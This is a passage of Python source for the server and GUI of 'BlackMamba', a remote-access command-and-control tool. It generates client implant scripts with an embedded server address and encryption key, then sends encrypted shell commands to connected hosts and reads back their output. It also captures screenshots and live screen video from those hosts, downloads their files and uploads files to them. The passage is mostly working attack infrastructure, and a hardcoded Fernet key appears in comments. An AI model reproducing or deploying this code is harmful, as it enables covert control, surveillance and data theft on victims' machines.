                    f'{gctfs}\nInvalid command or syntax, please try again. For more informations type "-help".\n')
            self.lineEdit_2.clear()
            return

    def create_script(self):
        file_path = self.lineEdit_2.text()
        server_ip = self.lineEdit_7.text()
        server_port = self.lineEdit_6.text()
        server_v_port = self.lineEdit_5.text()

        with open('bin/profile/crypt_key.txt', 'r') as f:
            crypt_key = f.read()
            f.close()

        script = body_script
        script = script.replace('SERVER_IP', f'{server_ip}').replace('SERVER_PORT', f'{server_port}')
        script = script.replace('SERVER_V_IP', f'{server_v_port}').replace('SERVER_KEY', f'{crypt_key}')

        with open(f'{file_path}/client.py', 'w') as f:
            f.write(script)
            f.close()

        del (script)

    def clientHandler(self, c, addr, system):
        global clients
        global refresh
        restore = None
        exec(
            f'global tag_{system[2]}_response; tag_{system[2]}_response = "RESPOSTA"; self.variables.append("tag_{system[2]}_response")')
        exec(
            f'global tag_{system[2]}_send; tag_{system[2]}_send = "hello"; self.variables.append("tag_{system[2]}_send")')

        print(f'\nclients -> {self.clients}')

        time_refresh = 0

        while True:
            with open(f'bin/request/transfer/execute/{system[2]}', 'r') as set_execute:
                execute = set_execute.read()
                set_execute.close()

            try:
                exec(f'global checkpoint; global data; data = tag_{system[2]}_send; checkpoint = data')
                if 'True' in execute:
                    #self.stop_hello = True

                    with open(f'bin/request/transfer/stdin/{system[2]}', 'r') as get_stdin:
                        data = get_stdin.read()
                        get_stdin.close()

                    with open(f'bin/request/transfer/stdin/{system[2]}', 'w') as clear_stdin:
                        clear_stdin.write('')
                        clear_stdin.close()

                    print(f'enviando -> {data}')
                    command_crypt = self.crypt(data, f'{server_key}')

                    if "%sv-init-live-video%" in data:
                        c.send(str(command_crypt).encode())
                        thread_stm = threading.Thread(target=self.start_stm_screen, args=())
                        thread_stm.daemon = True
                        thread_stm.start()

                        with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                            set_execute.write('False')
                            set_execute.close()

                        with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                            set_output.write('')
                            set_output.close()

                        with open(f'bin/request/transfer/stdin/{system[2]}', 'w') as set_output:
                            set_output.write('')
                            set_output.close()

                        continue

                    if "%get-screenshot%" in data:

                        try:
                            c.settimeout(1)
                            clear_buff = c.recv(1024)
                            print('buffer cleaned SCREENSHOT')
                        except:
                            pass

                        try:
                            c.send(str(command_crypt).encode())
                            try:
                                os.remove(f'bin/resources/cache/screenshot_{system[2]}.png')
                            except:
                                pass

                            f = open(f'bin/resources/cache/screenshot_{system[2]}.png', 'wb')
                            c.settimeout(15)
                            l = c.recv(1024*1024*5)

                            while (l):
                                print(l)
                                if b'\\@%end%@\\' in l:
                                    head, sep, tail = l.partition(b'\\@%end%@\\')

                                    l = head
                                    print(f'new {l}')
                                    f.write(l)
                                    break

                                f.write(l)
                                c.settimeout(15)
                                l = c.recv(1024*1024*5)
                            f.close()

                            with open(f'bin/resources/cache/screenshot_{system[2]}.png', 'rb') as f:
                                content_crypt_img = f.read()
                                f.close()

                            content_crypt_img = self.decrypt(content_crypt_img, f'{server_key}')

                            with open(f'bin/resources/cache/screenshot_{system[2]}.png', 'wb') as f:
                                f.write(content_crypt_img)
                                f.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('')
                                set_output.close()

                            with open(f'bin/request/transfer/stdin/{system[2]}', 'w') as set_output:
                                set_output.write('')
                                set_output.close()

                            continue


                        except Exception as exception:
                            print("Exception: {}".format(type(exception).__name__))
                            print("Exception message: {}".format(exception))

                            try:
                                pass
                                #os.remove(f'bin/resources/cache/screenshot_{system[2]}.png')
                            except:
                                pass

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('')
                                set_output.close()

                            with open(f'bin/request/transfer/stdin/{system[2]}', 'w') as set_output:
                                set_output.write('')
                                set_output.close()

                            continue

                    if data.startswith('-fget'):
                        if '/:' in data:
                            pass
                        else:
                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: Invalid syntax.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            continue

                        data_dict = data.replace('-fget ', '').split('/:')
                        print(data_dict)

                        try:
                            client_side = data_dict[0]
                            server_side = data_dict[1]

                            client_side = client_side.lstrip()
                            client_side = client_side.rstrip()

                            server_side = server_side.lstrip()
                            server_side = server_side.rstrip()

                            with open(server_side, 'w') as test_path:
                                test_path.write('0')

                        except:
                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: Invalid syntax.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            os.remove(server_side)
                            continue

                        try:
                            while True:
                                c.settimeout(1)
                                clear_buff = c.recv(1024*1024*5)
                                print('buffer cleaned FGET')
                        except:
                            print('except buffer fget')
                            pass

                        command_crypt = self.crypt(f'[FGET]{client_side}', f'{server_key}')
                        c.send(str(command_crypt).encode())
                        f = open(f'{server_side}', 'wb')
                        c.settimeout(25)
                        l = c.recv(1024*1024)

                        while (l):
                            time.sleep(0.1)
                            try:
                                if b'%&@end__tag@&%' in l:
                                    break
                            except:
                                pass
                            print(f'writing => {l}')
                            f.write(l)

                            c.settimeout(25)
                            l = c.recv(1024*1024)

                        f.close()
                        print('FIM ARQUIVO\n\n\n')

                        with open(f'{server_side}', 'rb') as a:
                            b = a.read()

                        try:
                            b = self.decrypt(b, f'{server_key}')

                            with open(f'{server_side}', 'wb') as c:
                                c.write(b)
                        except:
                            pass

                        with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                            set_execute.write('False')
                            set_execute.close()

                        with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                            set_output.write('Download successful.\n')
                            set_output.write('')
                            set_output.close()

                        with open(f'bin/request/transfer/stdin/{system[2]}', 'w') as set_output:
                            set_output.write('')
                            set_output.close()

                        continue

                    if data.startswith('-fput'):
                        if '/:' in data:
                            pass
                        else:
                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: Invalid syntax.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            continue

                        data_dict = data.replace('-fput ', '').split('/:')
                        print(data_dict)
                        try:
                            server_side = data_dict[0]
                            client_side = data_dict[1]

                            client_side = client_side.lstrip()
                            client_side = client_side.rstrip()

                            server_side = server_side.lstrip()
                            server_side = server_side.rstrip()

                            if os.path.isfile(server_side):
                                pass
                            else:
                                with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                    set_output.write('Error: Invalid syntax.\n')
                                    set_output.close()

                                with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                    set_execute.write('False')
                                    set_execute.close()

                                continue

                        except Exception as e:
                            exc_type, exc_obj, exc_tb = sys.exc_info()
                            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                            print(exc_type, fname, exc_tb.tb_lineno)

                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: Invalid syntax.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            continue

                        print(server_side)
                        print(client_side)

                        #time.sleep(3)

                        try:
                            with open(server_side, 'rb') as file_content:
                                f_ct = file_content.read()
                                file_content.close()

                            f_ct = self.crypt_file(f_ct, f'{server_key}')

                            with open(f'{server_side}_tmp', 'wb') as file_cpt:
                                file_cpt.write(f_ct)

                            del (f_ct)


                        except Exception as exception:
                            print("Exception: {}".format(type(exception).__name__))
                            print("Exception message: {}".format(exception))

                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: An error has occurred with the file.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            continue

                        try:
                            f = open(f'{server_side}_tmp', 'rb')

                        except Exception as exception:
                            print("Exception: {}".format(type(exception).__name__))
                            print("Exception message: {}".format(exception))

                            with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                                set_output.write('Error: An error has occurred with the file.\n')
                                set_output.close()

                            with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                                set_execute.write('False')
                                set_execute.close()

                            continue

                        l = f.read(1024)

                        command_crypt = self.crypt(f'[FPUT]{client_side}',
                                                   f'{server_key}')
                        c.send(str(command_crypt).encode())
                        time.sleep(5)

                        while (l):
                            try:
                                # l = self.crypt(l, 'GZWKEhHGNopxRdOHS4H4IyKhLQ8lw1yU7vRLrM3sebY=')
                                # l = l.replace(b'b', b'%%GBITR%%')
                                print(f'> {l}')
                                c.settimeout(5)
                                c.send(l)
                            except:
                                print('except FGET')
                                break
                            l = f.read(1024)
                        f.close()
                        time.sleep(2)
                        c.send(str('%@end_tag@%').encode())

                        with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                            set_output.write('File uploaded with success.\n')
                            set_output.close()

                        with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                            set_execute.write('False')
                            set_execute.close()

                        os.remove(f'{server_side}_tmp')


                    ######################## COMMAND LINE ############################
                    else:
                        c.send(str(command_crypt).encode())

                        try:
                            c.settimeout(0.1)
                            clear_buff = c.recv(1024*1024*1024)
                            print('buffer cleaned')
                        except:
                            pass

                        #c.settimeout(20)

                        #data = c.recv(1024*1024*5) #### old recv mode
                        #data = data.decode('utf-8')  #### old recv mode

                        print('---------------------------------------------------------------')

                        data_string = ''

                        c.settimeout(20)
                        data = str(c.recv(1024))
                        #print(data)

                        data = data.replace('b"', '')
                        data = data.replace("b'", '')
                        #data = data.replace('"', '')
                        #data = data.replace("'", '')

                        #rmvth1 = data[-2:]
                        #rmvth2 = data[:4]
                        #data = data.replace(rmvth2, '')
                        #data = data.replace(rmvth1, '')
                        data_string += data

                        print(f'FRAGMENTO > {data}')


                        #data = data.decode('utf-8')

                        #data = self.decrypt(data, 'GZWKEhHGNopxRdOHS4H4IyKhLQ8lw1yU7vRLrM3sebY=')
                        #data_string += data.decode()

                        while True:
                            c.settimeout(2.5)
                            #print('aguardando')
                            try:
                                data = str(c.recv(4024))
                                data = data.replace('b"', '')
                                data = data.replace("b'", '')
                                data = data.replace('"', '')
                                data = data.replace("'", '')
                                #rmvth1 = data[-2:]
                                #rmvth2 = data[:4]
                                #data = data.replace(rmvth2, '')
                                #data = data.replace(rmvth1, '')
                                data_string += data

                                print(f'FRAGMENTO > {data}')
                            except:
                                break

                            if (len(data) < 1):
                                break
                            #data_string += data.decode()
                            #data_string += data

                        data_string = data_string.replace('"', '')
                        data_string = data_string.replace("'", '')

                        print(data_string)
                        data_string = data_string.replace('%%GBITR%%', 'b')

                        print(data_string)
                        print('---------------------------------------------------------------')

                        try:
                            decrypt_data = self.decrypt(bytes(data_string, encoding='utf-8'), f'{server_key}')
                        except:
                            decrypt_data = b'None'

                        print(f'bytes -> {decrypt_data}')

                        try:
                            if b"stty: \'standard input\': Inappropriate ioctl for device\\n" in decrypt_data:
                                counter = decrypt_data.count(b"stty: \'standard input\': Inappropriate ioctl for device\\n")
                                for e in reversed(range(counter)):
                                    print(e)
                                    rmvt = b"stty: \'standard input\': Inappropriate ioctl for device\\n" * e
                                    try:
                                        decrypt_data = decrypt_data.replace(rmvt, b'')
                                    except:
                                        pass

                            elif b"stty: \\\'standard input\\\': Inappropriate ioctl for device\\n" in decrypt_data:
                                counter = decrypt_data.count(b"stty: \\\'standard input\\\': Inappropriate ioctl for device\\n")
                                for e in reversed(range(counter)):
                                    print(e)
                                    rmvt = b"stty: \\\'standard input\\\': Inappropriate ioctl for device\\n" * e
                                    try:
                                        decrypt_data = decrypt_data.replace(rmvt, b'')
                                    except:
                                        pass

                            else:
                                counter = decrypt_data.count(b"stty: 'standard input': Inappropriate ioctl for device\n")
                                for e in reversed(range(counter)):
                                    rmvt = b"stty: 'standard input': Inappropriate ioctl for device\n" * e
                                    try:
                                        decrypt_data = decrypt_data.replace(rmvt, b'')
                                    except:
                                        pass
                        except:
                            pass

                        data = decrypt_data.decode('utf-8')

                        print(f'recebemos -> {data}')
                        print(type(data))

                        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                        ansi_escape = ansi_escape.sub('', data)
                        data = ansi_escape

                        print(f'regex {data}')
                        print(type(data))

                        rmb = data[:2]

                        if rmb == 'b"' or rmb == "b'":
                            data = data.replace(rmb, '')

                        print(f'escrevendo {data}')

                        #data = data.encode('utf-8', 'ignore')
                        #data = str(data)

                        #AQUI


                        with open(f'bin/request/transfer/stdout/{system[2]}', 'w') as set_output:
                            set_output.write(data)
                            set_output.close()

                        with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                            set_execute.write('False')
                            set_execute.close()

                        continue

            #except:

            except Exception as e:
                exc_type, exc_obj, exc_tb = sys.exc_info()
                fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                print(exc_type, fname, exc_tb.tb_lineno)

                print(f'host {system[1]} disconnected [1]')
                for e in self.clients:
                    if system[2] in e:
                        self.clients.remove(e)

                with open(f'bin/request/transfer/execute/{system[2]}', 'w') as set_execute:
                    set_execute.write('False')
                    set_execute.close()

                print(f'novo clients -> {self.clients}')
                break



            try:
                with open(f'bin/request/transfer/execute/{system[2]}', 'r') as set_execute:
                    execute_status = set_execute.read()
                    set_execute.close()

                if 'True' in execute_status:
                    continue

                if time_refresh == 4:
                    data_h = 'hello'
                    data_crp = self.crypt(data_h, f'{server_key}')
                    #print(f'HELLO {system[2]}')
                    c.send(str(data_crp).encode())
                    # refresh = False
                    time_refresh = 0

            except Exception as exception:
                print("Exception: {}".format(type(exception).__name__))
            #except (ConnectionAbortedError, AttributeError):
                print("Exception message: {}".format(exception))
                print(f'host {system[1]} disconnected [2]')

                for e in self.clients:
                    if system[2] in e:
                        self.clients.remove(e)

                print(f'new client -> {self.clients}')
                break

            time.sleep(3)
            time_refresh += 1

            #time.sleep(0.1)
            #time_refresh += 1

    def recvall(self, sock):
        BUFF_SIZE = 4096  # 4 KiB
        data = b''
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                # either 0 or end of data
                break
        return data

    def start_stm_screen(self):
        #thread_strms = threading.Thread(target=start_stream, args=())
        #thread_strms.daemon = True
        #thread_strms.start()
        #start_stream()
        dir_path = os.path.dirname(os.path.realpath(__file__))
        print(dir_path)

        if 'linux' in str(platform.platform()).lower():
            try:
                os.system(f'sudo {python_v} {dir_path}/vstrm_server.py {SERVER_IP} {PORT_VIDEO}')
            except:
                pass

        if 'windows' in str(platform.platform()).lower():
            try:
                os.system(f'{dir_path}/vstrm_server.py {SERVER_IP} {PORT_VIDEO}')
            except:
                pass


    # monitora novas tentativas de conexões
    def search_host(self):
        for i in range(9999):

            try:
                c, addr = self.s.accept()
                system_id = addr[1]
                system_ip = addr[0]
            except:
                pass

            # erro de conflito aqui
            try:
                system_info = (c.recv(1024)).decode('utf-8')
            except:
                continue


            rcvdData = system_info
            rcvdData = str(rcvdData).replace("b'", "").replace("'", "")
            rcvdData = bytes(rcvdData, encoding='utf-8')

            # erro de conflito aqui
            try:
                str_content = self.decrypt(rcvdData, f'{server_key}')
            except:
                continue

            str_content = str(str_content).replace("b'", "").replace("'", "")
            system_info = str_content

            print(system_info)

            charact1 = system_info[-1:]
            charact2 = system_info[:1]

            system_info = system_info.replace(charact1, '')
            system_info = system_info.replace(charact2, '')
            system_info = system_info.replace(' ', '')
            system_info = system_info.replace("'", '')

            cr1 = system_info[-1:]
            cr2 = system_info[:1]
            system_info = system_info.replace(cr1, '')
            system_info = system_info.replace(cr2, '')

            system_info_list = system_info.split(',')

            with open(f'bin/hosts/{system_info_list[1].replace("tag:","")}.txt', 'w') as put_host:
                for info in system_info_list:
                    put_host.write(f'{info}\n')
                put_host.close()

            with open(f'bin/request/transfer/execute/{system_info_list[1].replace("tag:","")}', 'w') as put_host:
                put_host.write(f'False')
                put_host.close()

            with open(f'bin/request/transfer/stdout/{system_info_list[1].replace("tag:","")}', 'w') as put_host:
                put_host.write(f'')
                put_host.close()

            with open(f'bin/request/transfer/stdin/{system_info_list[1].replace("tag:","")}', 'w') as put_host:
                put_host.write(f'')
                put_host.close()

            system_name = system_info_list[8].replace("uname:", "")
            try:
                system_tag = int(system_info_list[1].replace('tag:', ''))
            except:
                continue
            system_comp = [system_id, system_name, system_tag, system_ip, 'on']

            self.clients.append(system_comp)
            t = Thread(target=self.clientHandler, args=(c, addr, system_comp))
            self.trds.append(t)
            t.start()

        for t in self.trds:
            t.join()

    # deixa a funcao search_host() em thread
    def run(self):
        thread = threading.Thread(target=self.search_host, args=())
        thread.daemon = True
        thread.start()

    @staticmethod
    def crypt(msg, key):
        command = str(msg)
        command = bytes(command, encoding='utf8')
        cipher_suite = Fernet(key)
        encoded_text = cipher_suite.encrypt(command)
        return encoded_text

    @staticmethod
    def crypt_file(msg, key):
        cipher_suite = Fernet(key)
        encoded_text = cipher_suite.encrypt(msg)
        return encoded_text

    @staticmethod
    def decrypt(msg, key):
        cipher_suite = Fernet(key)
        decoded_text_f = cipher_suite.decrypt(msg)
        return decoded_text_f

    def run_refr(self):
        thread_r = threading.Thread(target=self.add_hosts, args=())
        thread_r.daemon = True
        thread_r.start()

    def refr(self):
        #self.refresh = True
        #time.sleep(6)
        self.add_hosts()
        #self.refr()
        #self.refresh = False

    def rem_bt(self):
        dir_path = str(os.path.dirname(os.path.realpath(__file__)))
        dir_path = dir_path.replace('\clientui', '')
        dir_path = dir_path.replace('/clientui', '')
        file_list = sorted(os.listdir(f"{dir_path}/bin/hosts"), key=len)

        # print(file_list)

        number = 0
        number2 = 0
        for links in file_list:
            self.commandLinkButton_3.deleteLater()



    def add_hosts(self):
        dir_path = str(os.path.dirname(os.path.realpath(__file__)))
        dir_path = dir_path.replace('\clientui', '')
        dir_path = dir_path.replace('/clientui', '')
        file_list = sorted(os.listdir(f"{dir_path}/bin/hosts"), key=len)


        #print(file_list)

        number = 0
        number2 = 0
        bttn = 0

        for links in file_list:

            tag_lk = links.replace('.txt', '')

            with open(f'bin/hosts/{links}', 'r') as info_of_host:
                info_list = info_of_host.read()
                info_list = info_list.split('\n')

                for scan in info_list:
                    if 'uname' in scan:
                        name_host = scan.replace('uname:','')

                info_of_host.close()

            #name_host = 'aaaaaaaaaaaaa'
            
            try:
                if len(name_host) >= 14:
                    rpl = name_host[:11] + '...'
                    name_host = rpl
            except:
                continue

            exec(f'global commandLinkButton_{number}; commandLinkButton_{number} = QCommandLinkButton(self.scrollAreaWidgetContents_2)')
            exec(f'global btnh; btnh = commandLinkButton_{number}')
            btnh.setObjectName(u"commandLinkButton_x")
            btnh.setMinimumSize(QSize(26, 36))
            btnh.setMaximumSize(QSize(135, 36))
            btnh.setCursor(QCursor(Qt.PointingHandCursor))
            btnh.setStyleSheet(u"background-color: rgb(33, 37, 43);\n"
                                                   "color:white;\n"
                                                   "border-style: outset;\n"
                                                   "border-width:2px;\n"
                                                   "border-radius:10px;\n"
                                                   "border-color:  rgb(33, 37, 43);\n"
                                                   "\n"
                                                   "padding: 6px;\n"
                                                   "min-width:10px;")
            icon4 = QIcon()


            if (links.replace(".txt","")) in str(self.clients):
                exec(f'icon4.addFile(u":/24x24/icons/24x24/status_on.png", QSize(), QIcon.Normal, QIcon.Off)')
            else:
                exec(f'icon4.addFile(u":/24x24/icons/24x24/status_off.png", QSize(), QIcon.Normal, QIcon.Off)')

            btnh.setIcon(icon4)
            btnh.setIconSize(QSize(17, 17))

            self.gridLayout_4.addWidget(btnh, number2, number, 1, 1)

            self.scrollArea.setWidget(self.scrollAreaWidgetContents_2)

            self.gridLayout_3.addWidget(self.scrollArea, 0, 0, 1, 1)
            btnh.setText(QCoreApplication.translate("MainWindow", f"{name_host}", None))
            exec(f'global btnh; btnh.clicked.connect(lambda: void({tag_lk}))')

            number += 1

            if number == 6:
                number2 += 1
                number = 0

        number = 0


    @staticmethod
    def decrypt(msg, key):
        cipher_suite = Fernet(key)
        decoded_text_f = cipher_suite.decrypt(msg)
        return decoded_text_f

    def run_painel(self, host_name):
        with open(f'bin/hosts/{host_name}.txt', 'r') as get_info_host:
            info_host_list = get_info_host.read()
            info_host_list = info_host_list.split('\n')
            get_info_host.close()

    def thread_1(self, hifh=None):
        self.selected = hifh
        interval = 1
        self.interval = interval
        self.thread = threading.Thread(target=self.painel_init, args=())
        self.thread.daemon = True
        self.thread.start()

    def painel_init(self, infh):
        self.w = host_painel(host_slc=infh)
        self.w.show()

    def menu_hosts(self):
        self.stackedWidget.setCurrentIndex(3)

    def menu_add_host(self):
        self.stackedWidget.setCurrentIndex(1)

    def menu_shell(self):
        self.stackedWidget.setCurrentIndex(2)

    @staticmethod
    def menu_help():
        import webbrowser
        webbrowser.open('https://github.com/Loseys/BlackMamba')

    # setupUi

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate("MainWindow", u"MainWindow", None))
        self.btn_toggle_menu.setText("")
        self.label_title_bar_top.setText(QCoreApplication.translate("MainWindow", u"BlackMamba", None))
#if QT_CONFIG(tooltip)
        self.btn_minimize.setToolTip(QCoreApplication.translate("MainWindow", u"Minimize", None))
#endif // QT_CONFIG(tooltip)
        self.btn_minimize.setText("")
#if QT_CONFIG(tooltip)
        self.btn_maximize_restore.setToolTip(QCoreApplication.translate("MainWindow", u"Maximize", None))
#endif // QT_CONFIG(tooltip)
        self.btn_maximize_restore.setText("")
#if QT_CONFIG(tooltip)
        self.btn_close.setToolTip(QCoreApplication.translate("MainWindow", u"Close", None))
#endif // QT_CONFIG(tooltip)
        self.btn_close.setText("")
        self.label_top_info_1.setText(QCoreApplication.translate("MainWindow", u"BlackMamba", None))
        self.label_top_info_2.setText("")
        self.btn_new_user.setText(QCoreApplication.translate("MainWindow", u"Hosts", None))
        self.btn_save_2.setText(QCoreApplication.translate("MainWindow", u"Console", None))
        self.btn_save_2.setText(QCoreApplication.translate("MainWindow", u"C2 Terminal", None))
        self.btn_new_3.setText(QCoreApplication.translate("MainWindow", u"New Host", None))
        self.btn_new_4.setText(QCoreApplication.translate("MainWindow", u"Help", None))
        self.btn_new_user2.setText(QCoreApplication.translate("MainWindow", u"Refresh", None))

        self.label_6.setText(QCoreApplication.translate("MainWindow", u"HOME", None))
        self.label.setText(QCoreApplication.translate("MainWindow", u"", None))
        self.label_7.setText(QCoreApplication.translate("MainWindow", u"Page Index 0", None))
        self.labelBoxBlenderInstalation.setText(QCoreApplication.translate("MainWindow", u"Create script", None))
        self.lineEdit_2.setText("")
        self.lineEdit_2.setPlaceholderText(QCoreApplication.translate("MainWindow", u"Ex: C:/Users/User/Documents", None))
        self.pushButton_2.setText(QCoreApplication.translate("MainWindow", u"create", None))
        self.labelVersion_4.setText(QCoreApplication.translate("MainWindow", u"", None))
        #self.plainTextEdit.setPlainText(QCoreApplication.translate("MainWindow", u"BlackMamba\n"
#"\n"
#"", None))
        #self.lineEdit_3.setPlaceholderText("")
        self.label_credits.setText(QCoreApplication.translate("MainWindow", u"BlackMamba by Loseys", None))
        self.label_version.setText(QCoreApplication.translate("MainWindow", u"v1.0.41", None))
    # retranslateUi


class host_painel(QMainWindow):
    def __init__(self, host_slc=None):
        QMainWindow.__init__(self)
        self.ui = Ui_MainWindow2()
        self.ui.setupUi(self, hselected=host_slc)

        ## PRINT ==> SYSTEM
        #print('System: ' + platform.system())
        #print('Version: ' +platform.release())

        ########################################################################
        ## START - WINDOW ATTRIBUTES
        ########################################################################

        ## REMOVE ==> STANDARD TITLE BAR
        UIFunctions.removeTitleBar(True)
        ## ==> END ##

        ## SET ==> WINDOW TITLE
        self.setWindowTitle('BlackMamba')
        try:
            with open(f'bin/hosts/{host_slc}.txt', 'r') as set_name_window:
                snw = set_name_window.read().split('\n')
                for snw_select in snw:
                    if 'uname' in snw_select:
                        snw_select = snw_select.replace('uname:', '')
                        UIFunctions.labelTitle(self, f'{snw_select}')
                        UIFunctions.labelDescription(self, '')
        except:
            UIFunctions.labelTitle(self, f'BlackMamba')
            UIFunctions.labelDescription(self, '')
        ## ==> END ##

        ## WINDOW SIZE ==> DEFAULT SIZE
        startSize = QSize(1000, 720)
        self.resize(startSize)
        self.setMinimumSize(startSize)
        # UIFunctions.enableMaximumSize(self, 500, 720)
        ## ==> END ##

        ## ==> CREATE MENUS
        ########################################################################

        ## ==> TOGGLE MENU SIZE
        #self.ui.btn_toggle_menu.clicked.connect(lambda: UIFunctions.toggleMenu(self, 220, True))
        ## ==> END ##

        ## ==> ADD CUSTOM MENUS
        #self.ui.stackedWidget.setMinimumWidth(20)

        #UIFunctions.addNewMenu(self, "HOME", "btn_home", "url(:/16x16/icons/16x16/cil-home.png)", True)
        #UIFunctions.addNewMenu(self, "Add User", "btn_new_user", "url(:/16x16/icons/16x16/cil-user-follow.png)", True)
        #UIFunctions.addNewMenu(self, "Custom Widgets", "btn_widgets", "url(:/16x16/icons/16x16/cil-equalizer.png)", False)

        ## ==> END ##

        # START MENU => SELECTION
        UIFunctions.selectStandardMenu(self, "btn_home")
        ## ==> END ##

        ## ==> START PAGE
        #self.ui.stackedWidget.setCurrentWidget(self.ui.page_home)
        ## ==> END ##

        ## USER ICON ==> SHOW HIDE
        UIFunctions.userIcon(self, "WM", "", True)
        ## ==> END ##

        ## ==> MOVE WINDOW / MAXIMIZE / RESTORE
        ########################################################################
        def moveWindow(event):
            # IF MAXIMIZED CHANGE TO NORMAL
            if UIFunctions.returStatus() == 1:
                UIFunctions.maximize_restore(self)

            # MOVE WINDOW
            if event.buttons() == Qt.LeftButton:
                self.move(self.pos() + event.globalPos() - self.dragPos)
                self.dragPos = event.globalPos()
                event.accept()

        # WIDGET TO MOVE
        self.ui.frame_label_top_btns.mouseMoveEvent = moveWindow
        ## ==> END ##

        ## ==> LOAD DEFINITIONS
        ########################################################################
        UIFunctions.uiDefinitions(self)
        ## ==> END ##

        ########################################################################
        ## END - WINDOW ATTRIBUTES
        ############################## ---/--/--- ##############################




        ########################################################################
        #                                                                      #
        ## START -------------- WIDGETS FUNCTIONS/PARAMETERS ---------------- ##
        #                                                                      #
        ## ==> USER CODES BELLOW                                              ##
        ########################################################################



        ## ==> QTableWidget RARAMETERS
        ########################################################################
        #self.ui.tableWidget.horizontalHeader().setSectionResizeMode(QtWidgets.QHeaderView.Stretch)
        ## ==> END ##



        ########################################################################
        #                                                                      #
        ## END --------------- WIDGETS FUNCTIONS/PARAMETERS ----------------- ##
        #                                                                      #
        ############################## ---/--/--- ##############################


        ## SHOW ==> MAIN WINDOW
        ########################################################################
        self.show()
        ## ==> END ##


    ########################################################################
    ## MENUS ==> DYNAMIC MENUS FUNCTIONS
    ########################################################################


    def Button(self):
        # GET BT CLICKED
        btnWidget = self.sender()

        # PAGE HOME
        if btnWidget.objectName() == "btn_home":
            self.ui.stackedWidget.setCurrentWidget(self.ui.page_home)
            UIFunctions.resetStyle(self, "btn_home")
            UIFunctions.labelPage(self, "Home")
            btnWidget.setStyleSheet(UIFunctions.selectMenu(btnWidget.styleSheet()))

        # PAGE NEW USER
        if btnWidget.objectName() == "btn_new_user":
            self.ui.stackedWidget.setCurrentWidget(self.ui.page_home)
            UIFunctions.resetStyle(self, "btn_new_user")
            UIFunctions.labelPage(self, "New User")
            btnWidget.setStyleSheet(UIFunctions.selectMenu(btnWidget.styleSheet()))

        # PAGE WIDGETS
        if btnWidget.objectName() == "btn_widgets":
            self.ui.stackedWidget.setCurrentWidget(self.ui.page_widgets)
            UIFunctions.resetStyle(self, "btn_widgets")
            UIFunctions.labelPage(self, "Custom Widgets")
            btnWidget.setStyleSheet(UIFunctions.selectMenu(btnWidget.styleSheet()))

    ## ==> END ##

    ########################################################################
    ## START ==> APP EVENTS
    ########################################################################

    ## EVENT ==> MOUSE DOUBLE CLICK
    ########################################################################
    def eventFilter(self, watched, event):
        if watched == self.le and event.type() == QtCore.QEvent.MouseButtonDblClick:
            pass
            #print("pos: ", event.pos())
    ## ==> END ##

    ## EVENT ==> MOUSE CLICK
    ########################################################################
    def mousePressEvent(self, event):
        self.dragPos = event.globalPos()
        if event.buttons() == Qt.LeftButton:
            pass
            #print('Mouse click: LEFT CLICK')
        if event.buttons() == Qt.RightButton:
            pass
            #print('Mouse click: RIGHT CLICK')
        if event.buttons() == Qt.MidButton:
            pass
            #print('Mouse click: MIDDLE BUTTON')
    ## ==> END ##

    ## EVENT ==> KEY PRESSED
    ########################################################################
    def keyPressEvent(self, event):
        pass
        #print('Key: ' + str(event.key()) + ' | Text Press: ' + str(event.text()))
    ## ==> END ##

    ## EVENT ==> RESIZE EVENT
    ########################################################################
    def resizeEvent(self, event):
        pass
        #self.resizeFunction()
        #return super(MainWindow, self).resizeEvent(event)

    def resizeFunction(self):
        pass
        #print('Height: ' + str(self.height()) + ' | Width: ' + str(self.width()))
    ## ==> END ##

    ########################################################################
    ## END ==> APP EVENTS
    ############################## ---/--/--- ##############################


def void(selected):
    init_m = Ui_MainWindow()
    init_m.painel_init(selected)
